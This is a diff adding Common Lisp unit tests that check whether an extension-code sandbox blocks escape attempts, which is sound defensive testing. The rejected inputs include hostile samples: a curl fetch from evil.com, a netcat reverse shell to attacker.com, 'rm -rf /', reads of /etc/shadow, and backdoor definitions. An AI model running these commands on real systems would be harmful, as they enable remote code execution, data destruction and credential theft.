@@ -1108,3 +1108,613 @@
                    ("active" t (:boolean))))))
     (is-false (autopoiesis.security:validation-result-valid-p result))
     (is (= 1 (length (autopoiesis.security:validation-result-errors result))))))
+
+;;; ═══════════════════════════════════════════════════════════════════
+;;; Sandbox Escape Attempt Tests (Phase 10.2)
+;;; ═══════════════════════════════════════════════════════════════════
+;;;
+;;; These tests verify that the extension compiler sandbox properly blocks
+;;; various attempts to escape the sandbox and execute dangerous operations.
+
+;;; ─────────────────────────────────────────────────────────────────
+;;; Direct Forbidden Symbol Tests
+;;; ─────────────────────────────────────────────────────────────────
+
+(test sandbox-escape-direct-eval
+  "Test that direct eval calls are blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(eval '(delete-file "/etc/passwd")))
+    (is-false valid)
+    (is (some (lambda (e) (search "eval" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-direct-compile
+  "Test that direct compile calls are blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(compile nil '(lambda () (run-program "rm" '("-rf" "/")))))
+    (is-false valid)
+    (is (some (lambda (e) (search "compile" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-direct-load
+  "Test that direct load calls are blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(load "/tmp/malicious.lisp"))
+    (is-false valid)
+    (is (some (lambda (e) (search "load" e :test #'char-equal)) errors))))
+
+;;; ─────────────────────────────────────────────────────────────────
+;;; File System Escape Attempts
+;;; ─────────────────────────────────────────────────────────────────
+
+(test sandbox-escape-open-file
+  "Test that opening files is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(open "/etc/passwd" :direction :input))
+    (is-false valid)
+    (is (some (lambda (e) (search "open" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-with-open-file
+  "Test that with-open-file is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(with-open-file (stream "/etc/shadow")
+          (read-line stream)))
+    (is-false valid)
+    (is (some (lambda (e) (search "with-open-file" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-delete-file
+  "Test that delete-file is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(delete-file "/important/data.db"))
+    (is-false valid)
+    (is (some (lambda (e) (search "delete" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-rename-file
+  "Test that rename-file is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(rename-file "/etc/passwd" "/etc/passwd.bak"))
+    (is-false valid)
+    (is (some (lambda (e) (search "rename" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-probe-file
+  "Test that probe-file is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(probe-file "/etc/shadow"))
+    (is-false valid)
+    (is (some (lambda (e) (search "probe" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-directory
+  "Test that directory listing is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(directory "/home/*"))
+    (is-false valid)
+    (is (some (lambda (e) (search "directory" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-ensure-directories-exist
+  "Test that ensure-directories-exist is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(ensure-directories-exist "/tmp/malicious/path/"))
+    (is-false valid)
+    (is (some (lambda (e) (search "ensure-directories" e :test #'char-equal)) errors))))
+
+;;; ─────────────────────────────────────────────────────────────────
+;;; External Process Escape Attempts
+;;; ─────────────────────────────────────────────────────────────────
+
+(test sandbox-escape-run-program
+  "Test that run-program is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(run-program "curl" '("http://evil.com/malware.sh")))
+    (is-false valid)
+    (is (some (lambda (e) (search "run-program" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-sb-ext-run-program
+  "Test that sb-ext:run-program is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(sb-ext:run-program "/bin/sh" '("-c" "whoami")))
+    (is-false valid)
+    (is (some (lambda (e) (or (search "run-program" e :test #'char-equal)
+                               (search "sb-ext" e :test #'char-equal)))
+              errors))))
+
+(test sandbox-escape-uiop-run-program
+  "Test that uiop:run-program is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(uiop:run-program "cat /etc/passwd"))
+    (is-false valid)
+    (is (some (lambda (e) (or (search "run-program" e :test #'char-equal)
+                               (search "uiop" e :test #'char-equal)))
+              errors))))
+
+(test sandbox-escape-uiop-launch-program
+  "Test that uiop:launch-program is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(uiop:launch-program "nc -e /bin/sh attacker.com 4444"))
+    (is-false valid)
+    (is (some (lambda (e) (or (search "launch-program" e :test #'char-equal)
+                               (search "uiop" e :test #'char-equal)))
+              errors))))
+
+;;; ─────────────────────────────────────────────────────────────────
+;;; Global State Mutation Escape Attempts
+;;; ─────────────────────────────────────────────────────────────────
+
+(test sandbox-escape-setf
+  "Test that setf is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(setf *allowed-packages* '("EVERYTHING")))
+    (is-false valid)
+    (is (some (lambda (e) (search "setf" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-setq
+  "Test that setq is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(setq *forbidden-symbols* nil))
+    (is-false valid)
+    (is (some (lambda (e) (search "setq" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-defvar
+  "Test that defvar is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(defvar *backdoor* (lambda () (run-program "sh" nil))))
+    (is-false valid)
+    (is (some (lambda (e) (search "defvar" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-defparameter
+  "Test that defparameter is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(defparameter *evil-hook* #'identity))
+    (is-false valid)
+    (is (some (lambda (e) (search "defparameter" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-defconstant
+  "Test that defconstant is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(defconstant +backdoor-port+ 4444))
+    (is-false valid)
+    (is (some (lambda (e) (search "defconstant" e :test #'char-equal)) errors))))
+
+;;; ─────────────────────────────────────────────────────────────────
+;;; Definition Form Escape Attempts
+;;; ─────────────────────────────────────────────────────────────────
+
+(test sandbox-escape-defun
+  "Test that defun is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(defun backdoor () (run-program "sh" nil)))
+    (is-false valid)
+    (is (some (lambda (e) (search "defun" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-defmacro
+  "Test that defmacro is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(defmacro evil-macro (&body body)
+          `(progn (run-program "sh" nil) ,@body)))
+    (is-false valid)
+    (is (some (lambda (e) (search "defmacro" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-defclass
+  "Test that defclass is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(defclass backdoor-class ()
+          ((payload :initform (lambda () (run-program "sh" nil))))))
+    (is-false valid)
+    (is (some (lambda (e) (search "defclass" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-defmethod
+  "Test that defmethod is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(defmethod print-object :after ((obj t) stream)
+          (run-program "logger" (list (prin1-to-string obj)))))
+    (is-false valid)
+    (is (some (lambda (e) (search "defmethod" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-defgeneric
+  "Test that defgeneric is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(defgeneric backdoor-hook (obj)))
+    (is-false valid)
+    (is (some (lambda (e) (search "defgeneric" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-defstruct
+  "Test that defstruct is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(defstruct malicious-data payload))
+    (is-false valid)
+    (is (some (lambda (e) (search "defstruct" e :test #'char-equal)) errors))))
+
+;;; ─────────────────────────────────────────────────────────────────
+;;; Package Manipulation Escape Attempts
+;;; ─────────────────────────────────────────────────────────────────
+
+(test sandbox-escape-intern
+  "Test that intern is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(intern "BACKDOOR" :cl-user))
+    (is-false valid)
+    (is (some (lambda (e) (search "intern" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-export
+  "Test that export is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(export 'backdoor :autopoiesis))
+    (is-false valid)
+    (is (some (lambda (e) (search "export" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-import
+  "Test that import is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(import 'sb-ext:run-program))
+    (is-false valid)
+    (is (some (lambda (e) (search "import" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-use-package
+  "Test that use-package is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(use-package :sb-ext))
+    (is-false valid)
+    (is (some (lambda (e) (search "use-package" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-make-package
+  "Test that make-package is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(make-package :evil-package))
+    (is-false valid)
+    (is (some (lambda (e) (search "make-package" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-delete-package
+  "Test that delete-package is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(delete-package :autopoiesis.security))
+    (is-false valid)
+    (is (some (lambda (e) (search "delete-package" e :test #'char-equal)) errors))))
+
+;;; ─────────────────────────────────────────────────────────────────
+;;; Reader Manipulation Escape Attempts
+;;; ─────────────────────────────────────────────────────────────────
+
+(test sandbox-escape-set-macro-character
+  "Test that set-macro-character is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(set-macro-character #\@ (lambda (s c) (declare (ignore s c)) (run-program "sh" nil))))
+    (is-false valid)
+    (is (some (lambda (e) (search "set-macro-character" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-set-dispatch-macro-character
+  "Test that set-dispatch-macro-character is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(set-dispatch-macro-character #\# #\! (lambda (s c n) (declare (ignore s c n)) (run-program "sh" nil))))
+    (is-false valid)
+    (is (some (lambda (e) (search "set-dispatch-macro-character" e :test #'char-equal)) errors))))
+
+;;; ─────────────────────────────────────────────────────────────────
+;;; Function Introspection Escape Attempts
+;;; ─────────────────────────────────────────────────────────────────
+
+(test sandbox-escape-symbol-function
+  "Test that symbol-function is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(symbol-function 'validate-extension-code))
+    (is-false valid)
+    (is (some (lambda (e) (search "symbol-function" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-fdefinition
+  "Test that fdefinition is blocked"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(fdefinition 'check-permission))
+    (is-false valid)
+    (is (some (lambda (e) (search "fdefinition" e :test #'char-equal)) errors))))
+
+;;; ─────────────────────────────────────────────────────────────────
+;;; Nested/Obfuscated Escape Attempts
+;;; ─────────────────────────────────────────────────────────────────
+
+(test sandbox-escape-nested-in-let
+  "Test that forbidden operations nested in let are caught"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(let ((x 1))
+          (let ((y 2))
+            (eval '(+ x y)))))
+    (is-false valid)
+    (is (some (lambda (e) (search "eval" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-nested-in-progn
+  "Test that forbidden operations nested in progn are caught"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(progn
+          (+ 1 2)
+          (delete-file "/tmp/test")
+          (* 3 4)))
+    (is-false valid)
+    (is (some (lambda (e) (search "delete" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-nested-in-lambda
+  "Test that forbidden operations nested in lambda body are caught"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(lambda (x)
+          (when (> x 10)
+            (run-program "alert" (list (format nil "~a" x))))
+          x))
+    (is-false valid)
+    (is (some (lambda (e) (search "run-program" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-nested-in-flet
+  "Test that forbidden operations nested in flet are caught"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(flet ((helper (x)
+                 (eval x)))
+          (helper '(+ 1 2))))
+    (is-false valid)
+    (is (some (lambda (e) (search "eval" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-nested-in-labels
+  "Test that forbidden operations nested in labels are caught"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(labels ((recursive (n)
+                   (if (zerop n)
+                       (load "/tmp/payload.lisp")
+                       (recursive (1- n)))))
+          (recursive 5)))
+    (is-false valid)
+    (is (some (lambda (e) (search "load" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-nested-in-loop
+  "Test that forbidden operations nested in loop are caught"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(loop for i from 1 to 10
+              do (when (= i 5)
+                   (open "/etc/passwd"))
+              collect i))
+    (is-false valid)
+    (is (some (lambda (e) (search "open" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-nested-in-cond
+  "Test that forbidden operations nested in cond are caught"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(cond
+          ((= 1 1) (+ 1 2))
+          ((= 2 2) (eval '(+ 3 4)))
+          (t 0)))
+    (is-false valid)
+    (is (some (lambda (e) (search "eval" e :test #'char-equal)) errors))))
+
+(test sandbox-escape-nested-in-case
+  "Test that forbidden operations nested in case are caught"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(case (random 3)
+          (0 (+ 1 2))
+          (1 (compile nil '(lambda () t)))
+          (2 (* 3 4))))
+    (is-false valid)
+    (is (some (lambda (e) (search "compile" e :test #'char-equal)) errors))))
+
+;;; ─────────────────────────────────────────────────────────────────
+;;; Function Reference Escape Attempts
+;;; ─────────────────────────────────────────────────────────────────
+
+(test sandbox-escape-function-reference
+  "Test that #'forbidden-function references are caught"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(funcall #'eval '(+ 1 2)))
+    (is-false valid)
+    (is (some (lambda (e) (or (search "eval" e :test #'char-equal)
+                               (search "funcall" e :test #'char-equal)))
+              errors))))
+
+(test sandbox-escape-apply-forbidden
+  "Test that apply with forbidden functions is caught"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(apply #'delete-file '("/tmp/test")))
+    (is-false valid)
+    (is (some (lambda (e) (search "delete" e :test #'char-equal)) errors))))
+
+;;; ─────────────────────────────────────────────────────────────────
+;;; Make-Instance Escape Attempts
+;;; ─────────────────────────────────────────────────────────────────
+
+(test sandbox-escape-make-instance
+  "Test that make-instance is blocked (could create dangerous objects)"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(make-instance 'stream :direction :output))
+    (is-false valid)
+    (is (some (lambda (e) (search "make-instance" e :test #'char-equal)) errors))))
+
+;;; ─────────────────────────────────────────────────────────────────
+;;; Verify Safe Code Still Works
+;;; ─────────────────────────────────────────────────────────────────
+
+(test sandbox-allows-safe-arithmetic
+  "Test that safe arithmetic operations are allowed"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(let ((x 10) (y 20))
+          (+ (* x y) (- x y) (/ x y))))
+    (declare (ignore errors))
+    (is-true valid)))
+
+(test sandbox-allows-safe-list-operations
+  "Test that safe list operations are allowed"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(let ((lst '(1 2 3 4 5)))
+          (mapcar (lambda (x) (* x 2))
+                  (remove-if #'oddp lst))))
+    (declare (ignore errors))
+    (is-true valid)))
+
+(test sandbox-allows-safe-string-operations
+  "Test that safe string operations are allowed"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(let ((s "hello world"))
+          (concatenate 'string
+                       (string-upcase s)
+                       " - "
+                       (string-downcase s))))
+    (declare (ignore errors))
+    (is-true valid)))
+
+(test sandbox-allows-safe-control-flow
+  "Test that safe control flow is allowed"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(let ((n 10))
+          (cond
+            ((< n 0) :negative)
+            ((= n 0) :zero)
+            ((< n 10) :small)
+            (t :large))))
+    (declare (ignore errors))
+    (is-true valid)))
+
+(test sandbox-allows-safe-higher-order
+  "Test that safe higher-order functions are allowed"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(reduce #'+
+                (mapcar (lambda (x) (* x x))
+                        (remove-if-not #'evenp '(1 2 3 4 5 6 7 8 9 10)))))
+    (declare (ignore errors))
+    (is-true valid)))
+
+(test sandbox-allows-local-functions
+  "Test that local function definitions (flet/labels) are allowed"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(labels ((factorial (n)
+                   (if (<= n 1)
+                       1
+                       (* n (factorial (1- n)))))
+                 (fibonacci (n)
+                   (if (<= n 1)
+                       n
+                       (+ (fibonacci (- n 1))
+                          (fibonacci (- n 2))))))
+          (list (factorial 5) (fibonacci 10))))
+    (declare (ignore errors))
+    (is-true valid)))
+
+(test sandbox-allows-quoted-forbidden-symbols
+  "Test that quoted forbidden symbols are allowed (they're data, not code)"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(list 'eval 'compile 'load 'delete-file 'run-program))
+    (declare (ignore errors))
+    (is-true valid)))
+
+(test sandbox-allows-forbidden-as-variable-names
+  "Test that forbidden symbol names as variables are allowed"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(let ((eval 1)
+              (compile 2)
+              (load 3))
+          (+ eval compile load)))
+    (declare (ignore errors))
+    (is-true valid)))
+
+(test sandbox-allows-forbidden-as-lambda-params
+  "Test that forbidden symbol names as lambda parameters are allowed"
+  (multiple-value-bind (valid errors)
+      (autopoiesis.core:validate-extension-code
+       '(lambda (eval compile load)
+          (list eval compile load)))
+    (declare (ignore errors))
+    (is-true valid)))
+
+;;; ─────────────────────────────────────────────────────────────────
+;;; Compilation and Execution Tests
+;;; ─────────────────────────────────────────────────────────────────
+
+(test sandbox-compile-and-execute-safe
+  "Test that safe code can be compiled and executed"
+  (multiple-value-bind (ext errors)
+      (autopoiesis.core:compile-extension
+       "safe-factorial"
+       '(labels ((fact (n)
+                   (if (<= n 1) 1 (* n (fact (1- n))))))
+          (fact 5)))
+    (declare (ignore errors))
+    (is-true ext)
+    (is (= 120 (funcall (autopoiesis.core::extension-compiled ext))))))
+
+(test sandbox-compile-rejects-dangerous
+  "Test that dangerous code is rejected at compile time"
+  (multiple-value-bind (ext errors)
+      (autopoiesis.core:compile-extension
+       "dangerous-eval"
+       '(eval '(+ 1 2)))
+    (is (null ext))
+    (is (some (lambda (e) (search "eval" e :test #'char-equal)) errors))))
+
+(test sandbox-register-and-invoke-safe
+  "Test that safe extensions can be registered and invoked"
+  (let ((test-registry (make-hash-table :test 'equal)))
+    (multiple-value-bind (ext errors)
+        (autopoiesis.core:register-extension
+         "test-agent"
+         '(+ 100 200)
+         :registry test-registry)
+      (declare (ignore errors))
+      (is-true ext)
+      (let ((result (autopoiesis.core:invoke-extension
+                     (autopoiesis.core:extension-id ext)
+                     :registry test-registry)))
+        (is (= 300 result))))))
+
+(test sandbox-register-rejects-dangerous
+  "Test that dangerous extensions cannot be registered"
+  (let ((test-registry (make-hash-table :test 'equal)))
+    (multiple-value-bind (ext errors)
+        (autopoiesis.core:register-extension
+         "test-agent"
+         '(delete-file "/important/file")
+         :registry test-registry)
+      (is (null ext))
+      (is (some (lambda (e) (search "delete" e :test #'char-equal)) errors))
+      ;; Verify nothing was registered
+      (is (zerop (hash-table-count test-registry))))))
